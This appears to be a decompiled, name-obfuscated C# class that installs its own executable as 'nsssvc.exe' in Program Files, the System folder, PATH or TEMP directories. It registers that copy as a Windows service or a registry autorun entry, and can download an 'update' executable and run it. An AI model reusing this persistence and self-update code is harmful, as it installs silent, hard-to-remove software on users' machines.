using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using Microsoft.Win32;

internal class Class41
{
	protected string string_0 = null;

	[SpecialName]
	public Version method_0()
	{
		return Assembly.GetAssembly(GetType())!.GetName().Version;
	}

	protected void method_1(ArrayList arrayList_0)
	{
		arrayList_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower());
		arrayList_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower());
		string text = Environment.ExpandEnvironmentVariables("%PATH%").ToLower();
		string[] c = Class39.smethod_0(text, ";");
		arrayList_0.AddRange(c);
		text = Environment.ExpandEnvironmentVariables("%TEMP%").ToLower();
		text = Environment.ExpandEnvironmentVariables("%TMP%").ToLower();
		arrayList_0.Add(text);
	}

	public static bool smethod_0(Class23 class23_0, string string_1)
	{
		Class22 @class = new Class22(class23_0);
		string text = Environment.ExpandEnvironmentVariables("%TEMP%");
		if (text == null || text == "")
		{
			Environment.ExpandEnvironmentVariables("%TMP%");
		}
		if (text == null || text == "")
		{
			text = Directory.GetCurrentDirectory();
		}
		if (text != null && !(text == ""))
		{
			string string_2 = Path.Combine(text, "w3cs-nsssvc-update.exe");
			string_2 = @class.method_10(string_1, string_2, bool_0: true);
			if (string_2 != null)
			{
				return GClass1.smethod_13("open", string_2, "-update", text);
			}
			return false;
		}
		throw new Exception("Could not find download directory.");
	}

	protected bool method_2()
	{
		IntPtr intptr_;
		return Class45.smethod_21("nsssvc", out intptr_);
	}

	protected bool method_3(string string_1)
	{
		try
		{
			Class47 @class = new Class47(typeof(Class43));
			return @class.method_2(string_1);
		}
		catch (SecurityException)
		{
			throw;
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
			return false;
		}
	}

	protected string method_4(string string_1)
	{
		try
		{
			ArrayList arrayList = new ArrayList();
			if (string_1 != null)
			{
				arrayList.Add(string_1.ToLower());
			}
			method_1(arrayList);
			foreach (string item in arrayList)
			{
				string path2 = Path.Combine(item, "W3CS");
				string text = Path.Combine(path2, "nsssvc.exe");
				int num = 2;
				while (num-- > 0)
				{
					try
					{
						if (method_5(text))
						{
							return text;
						}
					}
					catch (IOException exception_)
					{
						Class37.smethod_8(exception_);
						text = Path.Combine(path2, "isssvc.exe");
						continue;
					}
					break;
				}
			}
			return Path.GetDirectoryName(Assembly.GetAssembly(GetType())!.Location);
		}
		catch (Exception exception_2)
		{
			Class37.smethod_8(exception_2);
			return null;
		}
	}

	protected bool method_5(string string_1)
	{
		try
		{
			string location = Assembly.GetAssembly(GetType())!.Location;
			string directoryName = Path.GetDirectoryName(string_1);
			if (!Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
			}
			if (File.Exists(string_1))
			{
				Version version = Class49.smethod_0(string_1);
				if (version < method_0())
				{
					File.Copy(location, string_1, overwrite: true);
				}
			}
			else
			{
				File.Copy(location, string_1, overwrite: true);
			}
			string_0 = string_1;
			return true;
		}
		catch (IOException)
		{
			throw;
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
			return false;
		}
	}

	protected bool method_6(RegistryKey registryKey_0)
	{
		return Class48.smethod_2(registryKey_0);
	}

	protected bool method_7(RegistryKey registryKey_0, string string_1)
	{
		Class48 @class = new Class48();
		return @class.method_0(string_1, registryKey_0);
	}

	protected Enum2 method_8(out bool bool_0)
	{
		bool_0 = false;
		bool flag = Environment.OSVersion.Platform == PlatformID.Win32NT;
		bool flag2 = true;
		string string_ = null;
		string text = null;
		if (flag)
		{
			IntPtr intPtr = IntPtr.Zero;
			bool flag3 = false;
			try
			{
				if (method_2())
				{
					bool_0 = true;
					intPtr = Class45.smethod_25("nsssvc", GClass2.GEnum1.flag_1 | GClass2.GEnum1.flag_2 | GClass2.GEnum1.flag_6);
					Class45.smethod_31(intPtr);
					string fullPath = Path.GetFullPath(Class45.smethod_29(intPtr));
					string_ = Path.GetDirectoryName(fullPath);
					string_ = Path.GetFullPath(Path.Combine(string_, ".."));
					if (!(flag3 = method_0() > Class49.smethod_0(fullPath)))
					{
						return Enum2.WindowsService;
					}
				}
				else
				{
					flag3 = true;
				}
				if (flag3)
				{
					text = method_4(string_);
					if (text != null && method_3(text))
					{
						return Enum2.WindowsService;
					}
				}
			}
			catch (SecurityException exception_)
			{
				flag2 = false;
				Class37.smethod_8(exception_);
			}
			catch (Exception exception_2)
			{
				Class37.smethod_8(exception_2);
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					Class45.smethod_15(intPtr);
				}
			}
		}
		int num = 2;
		RegistryKey registryKey = null;
		Enum2 result;
		if (!flag2)
		{
			num--;
			registryKey = Registry.CurrentUser;
			result = Enum2.UserAutoRun;
		}
		else
		{
			registryKey = Registry.LocalMachine;
			result = Enum2.MachineAutoRun;
		}
		while (num-- > 0)
		{
			try
			{
				bool flag4 = false;
				if (method_6(registryKey))
				{
					bool_0 = true;
					text = Path.GetFullPath(Class48.smethod_3(registryKey));
					if (!(flag4 = method_0() > Class49.smethod_0(text)))
					{
						return result;
					}
				}
				else
				{
					flag4 = true;
				}
				if (flag4)
				{
					text = method_4((text == null) ? null : Path.GetFullPath(Path.Combine(Path.GetDirectoryName(text), "..")));
					if (text != null && method_7(registryKey, text))
					{
						return result;
					}
				}
			}
			catch (SecurityException exception_3)
			{
				Class37.smethod_8(exception_3);
				registryKey = Registry.CurrentUser;
				result = Enum2.UserAutoRun;
			}
			catch (Exception exception_4)
			{
				Class37.smethod_8(exception_4);
				registryKey = Registry.CurrentUser;
				result = Enum2.UserAutoRun;
			}
		}
		return Enum2.Unspecified;
	}

	public Enum2 method_9()
	{
		bool bool_;
		return method_8(out bool_);
	}

	public static bool smethod_1(Enum2 enum2_0)
	{
		bool flag = false;
		try
		{
			switch (enum2_0)
			{
			case Enum2.WindowsService:
				return Class47.smethod_2();
			case Enum2.UserAutoRun:
				return Class48.smethod_4(Registry.CurrentUser);
			case Enum2.MachineAutoRun:
				return Class48.smethod_4(Registry.LocalMachine);
			default:
				return false;
			case Enum2.Unspecified:
			case Enum2.Standalone:
				return true;
			}
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
			return false;
		}
	}
}
